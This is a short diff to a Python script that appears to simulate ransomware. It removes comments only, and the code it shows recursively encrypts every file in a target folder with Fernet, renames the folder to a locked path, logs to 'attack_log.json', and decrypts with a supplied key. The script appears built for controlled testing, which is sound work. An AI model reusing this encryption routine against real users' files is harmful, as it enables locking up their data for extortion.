@@ -39,7 +39,6 @@ def decrypt_file(file_path, fernet):
             
         decrypted = fernet.decrypt(data)
         
-        # Remove .enc
         new_path = file_path[:-4] if file_path.endswith('.enc') else file_path.replace(".enc", "")
         
         with open(new_path, "wb") as file:
@@ -87,17 +86,14 @@ def encrypt_folder():
 
     total_files = 0
     
-    # Iterate through folder recursively
     for root, dirs, files in os.walk(utils.TARGET_FOLDER_PATH):
         for file in files:
             full_path = os.path.join(root, file)
-            # Avoid double encrypting
             if not full_path.endswith(".enc"):
                 if encrypt_file(full_path, fernet):
                     total_files += 1
 
     try:
-        # Rename folder after encryption
         os.rename(utils.TARGET_FOLDER_PATH, utils.LOCKED_FOLDER_PATH)
         duration = round(time.time() - start_time, 2)
         logger.log_event("FOLDER_RENAMED", utils.LOCKED_FOLDER_PATH, "SUCCESS", duration=duration, total_files=total_files)
@@ -132,7 +128,6 @@ def decrypt_folder(key):
                     total_files += 1
 
     try:
-        # Revert folder name to original
         os.rename(utils.LOCKED_FOLDER_PATH, utils.TARGET_FOLDER_PATH)
         duration = round(time.time() - start_time, 2)
         logger.log_event("FOLDER_RENAMED", utils.TARGET_FOLDER_PATH, "SUCCESS", duration=duration, total_files=total_files)
@@ -156,7 +151,6 @@ if __name__ == "__main__":
             print("Error: The --key parameter is required to decrypt.")
         else:
             print(f"Starting decryption on target: {utils.LOCKED_FOLDER_PATH}")
-            # Ensure the key is treated as bytes
             key_bytes = args.key.encode() if isinstance(args.key, str) else args.key
             decrypt_folder(key_bytes)
             print("Process complete. Check attack_log.json.")
